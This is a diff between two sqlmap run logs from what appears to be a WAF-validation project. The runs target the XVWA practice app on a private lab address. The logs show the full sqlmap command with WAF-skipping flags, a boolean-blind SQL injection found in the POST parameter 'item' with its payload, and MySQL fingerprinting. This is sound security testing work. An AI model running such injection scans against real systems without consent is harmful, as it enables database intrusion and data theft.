@@ -1,56 +1,55 @@
-=== SQLMap | xvwa/no_waf | "http://172.23.0.3:80/xvwa/vulnerabilities/sqli/" | 14/07/2026 22:37:43,56 ===
-CMD: sqlmap.py -u "http://172.23.0.3:80/xvwa/vulnerabilities/sqli/" -p "item" --data=item=1 --batch --user-agent="DoBotShield-TCC-Validation/1.0" --level=1 --risk=1 --retries=2 --technique=B --skip-waf --ignore-redirects --flush-session --delay=0.3 --tamper=equaltolike --string="Category"  --output-dir=/work
+=== SQLMap | xvwa/no_waf | "http://172.18.0.3:80/xvwa/vulnerabilities/sqli/" | 18/07/2026  0:01:33,03 ===
+CMD: sqlmap.py -u "http://172.18.0.3:80/xvwa/vulnerabilities/sqli/" -p "item" --data=item=1 --batch --user-agent="DoBotShield-TCC-Validation/1.0" --level=1 --risk=1 --retries=2 --technique=B --skip-waf --ignore-redirects --flush-session --delay=0.3 --answers="keep testing the others=Y,skip test payloads specific for other DBMSes=Y,extending provided level=N,redirect=N,continue with further target testing=Y" --string="Category"  --output-dir=/work
 ----------------------------------------------------------------
         ___
        __H__
- ___ ___[']_____ ___ ___  {1.10.7.105#dev}
-|_ -| . [)]     | .'| . |
-|___|_  [.]_|_|_|__,|  _|
+ ___ ___["]_____ ___ ___  {1.10.7.105#dev}
+|_ -| . [.]     | .'| . |
+|___|_  [,]_|_|_|__,|  _|
       |_|V...       |_|   https://sqlmap.org
 
 [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
 
-[*] starting @ 01:37:47 /2026-07-15/
+[*] starting @ 03:01:35 /2026-07-18/
 
-[01:37:47] [WARNING] using '/work' as the output directory
-[01:37:47] [INFO] loading tamper module 'equaltolike'
+[03:01:35] [WARNING] using '/work' as the output directory
 [1/1] URL:
-GET http://172.23.0.3:80/xvwa/vulnerabilities/sqli/
+GET http://172.18.0.3:80/xvwa/vulnerabilities/sqli/
 POST data: item=1
 do you want to test this URL? [Y/n/q]
 > Y
-[01:37:47] [INFO] testing URL 'http://172.23.0.3:80/xvwa/vulnerabilities/sqli/'
-[01:37:47] [INFO] using '/work/results-07152026_0137am.csv' as the CSV results file in multiple targets mode
-[01:37:47] [INFO] testing connection to the target URL
-[01:37:48] [INFO] testing if the provided string is within the target URL page content
-you have not declared cookie(s), while server wants to set its own ('PHPSESSID=e22822972b9...18be60cff7'). Do you want to use those [Y/n] Y
-[01:37:48] [INFO] heuristic (basic) test shows that POST parameter 'item' might be injectable (possible DBMS: 'MySQL')
-[01:37:49] [INFO] testing for SQL injection on POST parameter 'item'
-it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] N
-for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
-[01:37:49] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
-[01:37:49] [WARNING] reflective value(s) found and filtering out
-[01:37:50] [INFO] POST parameter 'item' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable 
-[01:37:50] [INFO] checking if the injection point on POST parameter 'item' is a false positive
+[03:01:36] [INFO] testing URL 'http://172.18.0.3:80/xvwa/vulnerabilities/sqli/'
+[03:01:36] [INFO] flushing session file
+[03:01:36] [INFO] using '/work/results-07182026_0301am.csv' as the CSV results file in multiple targets mode
+[03:01:36] [INFO] testing connection to the target URL
+[03:01:36] [INFO] testing if the provided string is within the target URL page content
+you have not declared cookie(s), while server wants to set its own ('PHPSESSID=d1020ac300e...7a6c393e15'). Do you want to use those [Y/n] Y
+[03:01:36] [INFO] heuristic (basic) test shows that POST parameter 'item' might be injectable (possible DBMS: 'MySQL')
+[03:01:37] [INFO] testing for SQL injection on POST parameter 'item'
+it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
+for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] N
+[03:01:37] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[03:01:37] [WARNING] reflective value(s) found and filtering out
+[03:01:38] [INFO] POST parameter 'item' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable 
+[03:01:38] [INFO] checking if the injection point on POST parameter 'item' is a false positive
 POST parameter 'item' is vulnerable. Do you want to keep testing the others (if any)? [y/N] Y
-sqlmap identified the following injection point(s) with a total of 13 HTTP(s) requests:
+sqlmap identified the following injection point(s) with a total of 12 HTTP(s) requests:
 ---
 Parameter: item (POST)
     Type: boolean-based blind
     Title: AND boolean-based blind - WHERE or HAVING clause
-    Payload: item=1 AND 9301=9301
+    Payload: item=1 AND 3199=3199
 ---
-[01:37:53] [WARNING] changes made by tampering scripts are not included in shown payload content(s)
 do you want to exploit this SQL injection? [Y/n] Y
-[01:37:53] [INFO] testing MySQL
-[01:37:53] [INFO] confirming MySQL
-[01:37:54] [INFO] the back-end DBMS is MySQL
+[03:01:40] [INFO] testing MySQL
+[03:01:41] [INFO] confirming MySQL
+[03:01:42] [INFO] the back-end DBMS is MySQL
 web server operating system: Linux Debian
-web application technology: Apache 2.4.54, PHP, PHP 7.4.33
+web application technology: PHP 7.4.33, PHP, Apache 2.4.54
 back-end DBMS: MySQL >= 5.0.0
-[01:37:57] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/work/results-07152026_0137am.csv'
+[03:01:44] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/work/results-07182026_0301am.csv'
 
-[*] ending @ 01:37:57 /2026-07-15/
+[*] ending @ 03:01:44 /2026-07-18/
 
 
 TOOL_RC_1=0
